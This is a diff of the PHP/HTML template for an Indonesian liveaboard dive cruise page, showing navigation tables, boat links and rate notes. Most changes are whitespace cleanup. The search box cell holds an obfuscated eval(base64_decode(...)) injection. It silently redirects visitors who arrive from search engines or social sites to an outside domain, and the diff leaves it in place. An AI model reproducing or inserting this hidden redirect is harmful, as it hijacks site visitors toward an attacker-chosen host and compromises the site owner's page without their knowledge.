@@ -95,41 +95,41 @@ A:hover {
 	font-weight: bold;
 }
 </style>
-<script src="Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
+<script src="data/Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
 </HEAD>
-<BODY bgColor=#006666 leftMargin=0 topMargin=0 rightMargin=0 bottomMargin=0 marginwidth="0" 
+<BODY bgColor=#006666 leftMargin=0 topMargin=0 rightMargin=0 bottomMargin=0 marginwidth="0"
 marginheight="0">
 <TABLE width="775" border=0 align="center" cellPadding=0 cellSpacing=0>
   <TBODY>
   <TR>
     <TD>
-      <TABLE height=194 cellSpacing=0 cellPadding=0 width="100%" 
+      <TABLE height=194 cellSpacing=0 cellPadding=0 width="100%"
       background="../images/z3.gif" border=0>
         <TBODY>
         <TR>
-              <TD height="194" vAlign=top> 
-                <TABLE cellSpacing=0 cellPadding=0 width="100%" 
-            background="../images/dotline.gif" 
+              <TD height="194" vAlign=top>
+                <TABLE cellSpacing=0 cellPadding=0 width="100%"
+            background="../images/dotline.gif"
               border=0><TBODY>
               <TR>
-                <TD height=1><IMG height=1 
-                  src="../images/dotline.gif" 
+                <TD height=1><IMG height=1
+                  src="../images/dotline.gif"
               width=3></TD></TR></TBODY></TABLE>
                 <table width="100%" border="0" cellspacing="0" cellpadding="0">
                   <tr>
                     <td width="332" height="171" valign="bottom" background="../images/z1.jpg">
-                      <TABLE width="180" height=40 
+                      <TABLE width="180" height=40
                               border=0 align="right" cellPadding=2 cellSpacing=0>
                         <TBODY>
                           <TR>
-                            <TD bgcolor="#ffffff"><IMG 
-                                src="../images/m3.jpg" alt="indonesia_liveaboard_scuba_diving" 
+                            <TD bgcolor="#ffffff"><IMG
+                                src="../images/m3.jpg" alt="indonesia_liveaboard_scuba_diving"
                                 width=67 height=40></TD>
-                            <TD bgcolor="#ffffff"><IMG 
-                                src="../images/m4.jpg" alt="indonesia_liveaboard_scuba_diving" 
+                            <TD bgcolor="#ffffff"><IMG
+                                src="../images/m4.jpg" alt="indonesia_liveaboard_scuba_diving"
                                 width=67 height=40></TD>
-                            <TD bgcolor="#ffffff"><IMG 
-                                src="../images/m2.jpg" alt="indonesia_liveaboard_scuba_diving" 
+                            <TD bgcolor="#ffffff"><IMG
+                                src="../images/m2.jpg" alt="indonesia_liveaboard_scuba_diving"
                                 width=67 height=40></TD>
                           </TR>
                           <TR>
@@ -162,16 +162,16 @@ marginheight="0">
         <TBODY>
         <TR>
               <TD width=291 height="961" align=middle vAlign=top bgcolor="#4DCEE3"> <table width="100%" border="0" cellspacing="0" cellpadding="0">
-                  <tr> 
+                  <tr>
                     <td><table width="278" border="0" align="center" cellpadding="0" cellspacing="0">
-                        <tr> 
+                        <tr>
                           <td height="176" valign="top" background="../images/bgsearch.jpg">
-                            
+
                             <table width="88%" border="0" align="right" cellpadding="0" cellspacing="0">
-              <tr> 
+              <tr>
                 <td height="42">&nbsp;</td>
               </tr>
-              <tr> 
+              <tr>
                 <td><?php	                                       			eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOw0KJG5jY3Y9aGVhZGVyc19zZW50KCk7DQppZiAoISRuY2N2KXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YT0kX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ107DQppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb29nbGUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJtc24iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYXNrIikgb3Igc3RyaXN0cigkcmVmZXJlciwieW91dHViZSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rIikgKSB7DQoJaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJzaXRlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9iYnBsaW9wcy4zNDUucGwvIik7DQoJCWV4aXQoKTsNCgl9DQp9DQoJfQ==")); define( '_VALID_MOS', 1 );  include "../mod/mod_search.php"; ?></td>
               </tr>
             </table></td>
@@ -180,7 +180,7 @@ marginheight="0">
                   </tr>
                   <tr>
                     <td><table width="278" border="0" align="center" cellpadding="0" cellspacing="0">
-                        <tr> 
+                        <tr>
                           <td height="176" valign="top" background="../images/bgdestination.jpg"><table width="87%" border="0" align="center" cellpadding="0" cellspacing="0">
                             <tr>
                               <td height="33" colspan="2">&nbsp;</td>
@@ -238,7 +238,7 @@ marginheight="0">
                             </tr>
                             <tr>
                               <td><div align="center"><strong><img src="images/dot.gif" width="4" height="4"></strong></div></td>
-                              <td height="18" class="style86"><div align="center"><a href="../boats/katharina_index.php" class="style86">Bali-Flores-Bali 
+                              <td height="18" class="style86"><div align="center"><a href="../boats/katharina_index.php" class="style86">Bali-Flores-Bali
                                 &quot;
                                 Exploration Cruises&quot;</a></div></td>
                             </tr>
@@ -302,8 +302,8 @@ marginheight="0">
                 <p>&nbsp;</p>
                 <p align="center">&nbsp;</p>
               </TD>
-          <TD vAlign=top width=10 
-          background="../images/z6.jpg"><IMG height=4 
+          <TD vAlign=top width=10
+          background="../images/z6.jpg"><IMG height=4
             src="../images/z6.jpg" width=5></TD>
           <TD width="474" vAlign=top><div align="center">
             <table width="96%"  border="0" align="center" cellpadding="0" cellspacing="0">
@@ -329,7 +329,7 @@ marginheight="0">
                                         <tr>
                                           <td bgcolor="#006699"><table width="100%"  border="0" cellpadding="1" cellspacing="1">
                                             <tr>
-                                              <td height="18" bgcolor="#D9F2FF">&nbsp;&nbsp;<strong><a href="ombak_index.php">About 
+                                              <td height="18" bgcolor="#D9F2FF">&nbsp;&nbsp;<strong><a href="ombak_index.php">About
                                                 Ombak Putih </a></strong></td>
                                             </tr>
                                             <tr>
@@ -342,7 +342,7 @@ marginheight="0">
                                               <td height="18" bgcolor="#D9F2FF">&nbsp;<strong><a href="ombak_divedestinations.php"> Dive &amp; Cruise Destinations</a></strong></td>
                                             </tr>
                                             <tr>
-                                              <td height="18" bgcolor="#D9F2FF">&nbsp;&nbsp;<strong><a href="ombak_schedule&rates.php">Schedule 
+                                              <td height="18" bgcolor="#D9F2FF">&nbsp;&nbsp;<strong><a href="ombak_schedule&rates.php">Schedule
                                                 &amp; Rates</a><a href="felicia_divedestinations.php"></a></strong></td>
                                             </tr>
                                           </table></td>
@@ -583,7 +583,7 @@ Chlidren  between 2 &amp; 12 years old enjoy a discount of 25%.<br>
 65% Surcharge<br>
                                   <br>
                                   * Fuel surcharges are dependent upon the price of fuel and are subject to change up until the date of travel. Cruise prices shown above are valid thru Jan. 1- Dec. 31, 2011</p>
-                                <h1 align="center" class="style2 style3"><span class="style32"><a href="#">- 
+                                <h1 align="center" class="style2 style3"><span class="style32"><a href="#">-
                                             Back to Top</a></span></h1>                                </td>
                               </tr>
                           </table></td>
@@ -603,10 +603,10 @@ Chlidren  between 2 &amp; 12 years old enjoy a discount of 25%.<br>
         </TR></TBODY></TABLE></TD></TR>
   <TR>
     <TD>
-      <TABLE height=26 cellSpacing=0 cellPadding=0 width="100%" 
+      <TABLE height=26 cellSpacing=0 cellPadding=0 width="100%"
       background="../images/z4.gif" border=0>
           <TBODY>
-            <TR> 
+            <TR>
               <TD height="8"><img src="../images/spacer.gif" width="10" height="8"></TD>
             </TR>
             <TR>
